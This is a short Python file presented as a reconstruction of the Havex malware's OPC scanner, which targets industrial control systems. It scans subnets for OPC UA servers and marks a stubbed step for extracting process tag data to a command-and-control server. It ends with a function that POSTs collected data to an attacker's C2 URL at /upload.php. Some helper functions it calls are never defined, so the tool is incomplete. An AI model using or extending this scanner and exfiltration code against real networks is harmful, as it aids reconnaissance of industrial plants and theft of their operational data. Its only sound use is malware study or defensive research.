# havex_scanner.py - Reconstruct Havex OPC DA scanner
import socket
import struct

class HavexOPCScanner:
    def __init__(self):
        self.opc_ports = [135, 4840, 48400]  # DCOM, OPC UA

    def scan_network(self, subnet):
        """
        Scan for OPC servers (like Havex did)
        """
        for ip in self.generate_ips(subnet):
            if self.check_opc_server(ip):
                print(f"[+] OPC Server found: {ip}")
                self.enumerate_opc_tags(ip)

    def check_opc_server(self, ip):
        """
        Check if host is OPC server
        """
        try:
            # Try OPC UA discovery
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, 4840))

            # Send OPC UA Hello message
            hello_msg = self.craft_opcua_hello()
            sock.send(hello_msg)

            response = sock.recv(1024)
            if response.startswith(b'ACK'):
                return True

        except:
            pass

        return False

    def enumerate_opc_tags(self, ip):
        """
        Extract OPC tag list (process data names)
        Exfiltrate to C2 for analysis
        """
        # Use OPC DA/UA client libraries
        # Read tag database
        # Send to C2 server
        pass

# Havex exfiltration via HTTP (to compromised PHP pages)
def exfiltrate_data(data, c2_url):
    import requests
    requests.post(c2_url + "/upload.php", data={'data': data})
